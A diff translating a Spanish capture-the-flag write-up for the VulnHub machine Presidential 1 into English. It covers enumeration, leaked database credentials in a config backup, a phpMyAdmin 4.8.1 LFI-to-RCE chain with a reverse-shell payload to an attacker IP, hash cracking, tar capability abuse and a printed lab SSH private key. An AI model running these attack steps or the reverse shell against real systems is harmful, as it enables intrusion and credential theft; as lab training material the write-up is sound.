@@ -1,9 +1,8 @@
-
 ---
 aliases: []
 tags:
   - writeup
-  - maquina
+  - machine
   - vulnhub
   - linux
   - lfi
@@ -11,55 +10,55 @@ tags:
   - reverse-shell
   - phpmyadmin
   - capabilities
-maquina: Presidential 1
-plataforma: Linux
-dificultad: null
-fecha_resolucion: null
-tecnicas_clave:
+machine: Presidential 1
+platform: Linux
+difficulty: Medium/Hard
+date_solved: 2026-09-24
+key_techniques:
   - phpMyAdmin LFI
   - LFI to RCE
   - tar capability abuse
 cve: []
-vector_inicial: Web application and phpMyAdmin
-escalada_privilegios: tarS capability abuse to read root's SSH key
-autor: null
+initial_vector: Web application and phpMyAdmin
+privilege_escalation: tarS capability abuse to read root's SSH key
+author: null
 writeup_url: https://www.vulnhub.com/entry/presidential-1,500/
 ---
 
-- **Máquina Presidential 1**: [https://www.vulnhub.com/entry/presidential-1,500/](https://www.vulnhub.com/entry/presidential-1,500/)
+- **Presidential 1 machine**: [https://www.vulnhub.com/entry/presidential-1,500/](https://www.vulnhub.com/entry/presidential-1,500/)
 
-## Reconocimiento:
+## Reconnaissance
 
-Hacemos un *arp-scan* para descubrir la IP de la máquina, lanzamos un PING a la misma y podemos ver que el ttl es 64 lo que nos indica que es una máquina linux. *192.168.18.239*
+We run an *arp-scan* to find the machine's IP, send it a PING, and see the TTL is 64, which tells us it's a Linux machine. *192.168.18.239*
 
-Le aplicamos un *nmap* a la ip para descubrir los puertos abiertos, un modo escaneo silencioso, con un min-rate de 5000, con triple verbose y sin resolución DNS ni Host Discovery
+We run an *nmap* against the IP to find the open ports: a stealth scan, min-rate 5000, triple verbose, with no DNS resolution or host discovery.
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.239 -oG allPorts
 ```
-Le lanzamos un conjunto de scripts básicos de reconocimiento a los puertos que están abiertos y lo exportamos todo en formato nmap a un archivo *targeted*.
+We run a set of basic recon scripts against the open ports and export everything in nmap format to a *targeted* file.
 ```bash
 nmap -sCV -p80,2082 192.168.18.239 -oN targeted
 ```
 
- Al hacer un whatweb a la dirección IP de la máquina víctima podemos ver un posible dominio llamado *votenow.local* por si hay virtual hosting, asi que nos abrimos el *etc/hosts* y añadimos ese dominio.
+Running whatweb against the victim's IP reveals a possible domain *votenow.local* in case there's virtual hosting, so we open *etc/hosts* and add that domain.
 
-Le lanzamos un nmap con los scripts al puerto 80 de la máquina víctima.
+We run an nmap with scripts against port 80 of the victim machine.
 ```bash
 nmap --script http-enum -p80 192.168.18.239
 ```
-Nos reporta un directorio */icons* pero sin mas. Asi que le aplicamos un gobuster para descubrir mas cosas.
+It reports an */icons* directory but nothing else, so we run gobuster to discover more.
 ```bash
 gobuster dir -u http://192.168.18.239/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 --add-slash
 ```
-Y encontramos el directorio */assets y un /cgi-bin* pero sin mas, asi que buscamos por subdominios.
+We find the */assets* directory and a */cgi-bin* but nothing more, so we look for subdomains.
 ```bash
 gobuster vhost -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --append-domain | grep -v "400"
 ```
-Con el último comando llegamos a descubrir un *datasafe.votenow.local* que añadimos al */etc/hosts* y nos metemos para ver un login de *phpMyAdmin*. Pero no disponemos de credenciales aún. Asi que nos ponemos a buscar de forma mas profunda. Buscamos archivos que acaben con extensión *php* entre otras y encontramos un config.php pero completamente vacío asi que buscamos *php.bak* para ver algún archivo de backup o guardado.
+The last command reveals *datasafe.votenow.local*, which we add to */etc/hosts*; browsing there we find a *phpMyAdmin* login, but we have no credentials yet. So we search more deeply. We look for files ending in *php* among others and find a config.php that is completely empty, so we search for *php.bak* to find a backup or saved file.
 ```bash
 gobuster dir -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php,txt,php.bak,bak,tar
 ```
-Y por fin encontramos un *config.php.bak* con la contraseña, usuario, host y name en texto claro.
+And finally we find a *config.php.bak* with the password, user, host and name in cleartext.
 ```php
 <?php
 
@@ -71,11 +70,11 @@ $dbname = "votebox";
 ?>
 ```
 
-Con estas credenciales nos metemos al phpMyAdmin, para ver la versión, resulta estar utilizando una version *4.8.1* vulnerable a un LFI y RCE según searchsploit, nos metemos al RCE y miramos un poco lo que hace, para ejecutarlo nosotros.
+With these credentials we log into phpMyAdmin; checking the version, it turns out to be *4.8.1*, vulnerable to an LFI and RCE according to searchsploit. We look at the RCE and study what it does so we can run it ourselves.
 ```python
 /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
 ```
-Con la siguiente linea tenemos un LFI y podemos apuntar a otros archivos. Intentamos listar los logs de apache o ssh pero no existen. El /proc/net/tcp si podemos listarlo. Lo guardamos en un archivo data. 
+With the following line we have an LFI and can point at other files. We try to list the Apache or SSH logs but they don't exist. /proc/net/tcp we can list, though. We save it to a data file.
 ```bash
  0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18606 1 ffff8b7936e007c0 100 0 0 10 0                     
    1: 00000000:0822 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18508 1 ffff8b7936e00000 100 0 0 10 0                     
@@ -85,20 +84,20 @@ Con la siguiente linea tenemos un LFI y podemos apuntar a otros archivos. Intent
    5: EF12A8C0:0050 E212A8C0:CA5C 06 00000000:00000000 03:000015C0 00000000     0        0 0 3 ffff8b78aa62a900
 ```
 
-Con este comando verémos que puertos estan abiertos, los puertos 80, 2082 e internamente también esta abierto el *3306*. Correspondiente a mysql, que podemos enumerar con un */proc/sched_debug*.
+With this command we'll see which ports are open: 80, 2082 and, internally, *3306* as well, corresponding to MySQL, which we can enumerate via */proc/sched_debug*.
 ```bash
 for port in $(cat data | awk '{print $2}' | awk '{print $2}' FS=":" | sort -u); do echo "[+] Port $port -> $((0x$port))"; done
 ```
 
-Identificador de sesión: viadnld0oeopbg5nl7i0inil09er2fsk
+Session identifier: viadnld0oeopbg5nl7i0inil09er2fsk
 ```url
 http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_viadnld0oeopbg5nl7i0inil09er2fsk
 ```
-Aqui podemos ver como derivar el LFI al RCE, si tu hacer una query en la url de arriba podemos ver la misma, y como estamos en un recurso php, la web nos lo interpreta.
+Here we can see how to turn the LFI into RCE: if you run a query in the URL above you can see it, and since we're in a PHP resource the site executes it for us.
 ```php
 select '<?php system("bash -i >& /dev/tcp/192.168.18.226/443 0>&1"); ?>';
 ```
-La página se queda cargando, con lo cuál ya no podemos acceder al phpMyAdmin y aún tenemos posibles contraseñas alli. Lo que vamos a hacer es ponernos en escucha otra vez y desde la reverse shell vamos a entablarnos otra reverse shell pero en segundo plano. Hacemos un tratamiento de la tty.
+The page hangs loading, so we can no longer reach phpMyAdmin and we still have possible passwords there. What we'll do is start a listener again and, from the reverse shell, open another reverse shell in the background. We upgrade the TTY.
 ```bash
 script /dev/null -c bash
 #ctrl + z
@@ -109,25 +108,25 @@ export TERM=xterm
 export SHELL=bash
 stty rows 44 columns 184
 ```
-Dentro de phpMyAdmin en votebox/ users podemos encontrar un usuario y un hash.
+Inside phpMyAdmin, under votebox/users, we find a user and a hash.
 ```bash
 admin:$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
 ```
-Vamos a crackearlo. (Para encontrar el rockyou.txt, he tenido que usar sudo find / -name "rockyou.txt*" 2>/dev/null porque no me acordaba la ruta.)
+We'll crack it. (To find rockyou.txt I had to use sudo find / -name "rockyou.txt*" 2>/dev/null because I couldn't remember the path.)
 ```bash
 john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 ```
-El comando de john tarda un poco (mucho) en crackearlo. El resultado es: *Stella* y con esta contraseña podemos hacer un su a *admin* y entrar en el directorio. 
+The john command takes a while (a long while) to crack it. The result is *Stella*, and with this password we can su to *admin* and enter the directory.
 
-### Escalada de privilegios
-Para escalar privilegios, buscamos archivos con SUID, pero no encontramos nada interesante. Pasamos e ver la capabilities.
+### Privilege escalation
+To escalate privileges we look for SUID files, but find nothing interesting. We move on to capabilities.
 ```bash
 find / -perm -4000 2>/dev/null
 
 getcap -r / 2>/dev/null
 ```
-Encontramos una capability que nos deja crear un comprimido que no podemos ver, luego descomprimirlo y verlo. */usr/bin/tarS*
-Asi que vamos a comprimir la clave de root:
+We find a capability that lets us create an archive we can't read, then extract and read it: */usr/bin/tarS*.
+So we archive root's key:
 ```bash
 tarS -cvf id_rsa.tar /root/.ssh/id_rsa
 tar -xf id_rsa.tar
@@ -135,7 +134,7 @@ cd root/
 cd .ssh/
 cat id_rsa
 ```
-La clave privada:
+The private key:
 ```bash
 -----BEGIN RSA PRIVATE KEY-----
 MIIJKQIBAAKCAgEAqCxgVFD0v4dmf8XgX5fKVeZ7V5LcY8hdKTDebvjCtrASgFnQ
@@ -190,8 +189,8 @@ SeSIdV0ITWhpxuG+K10LN69mYuTAZm6ihc0MM3v4nRtE3UpV74FCkQsTIfKC
 -----END RSA PRIVATE KEY-----
 ```
 
-Nos conectamos por ssh, en el puerto 2082, **RECUERDA ESCRIBIR EL YES.**
+We connect over SSH on port 2082. **REMEMBER TO TYPE YES.**
 ```bash
 ssh -i id_rsa root@localhost -p 2082
 ```
-![[Pasted image 20260924204735.png]]
+![[Pasted image 20260924204735.png|SSH access as root and final flag]]
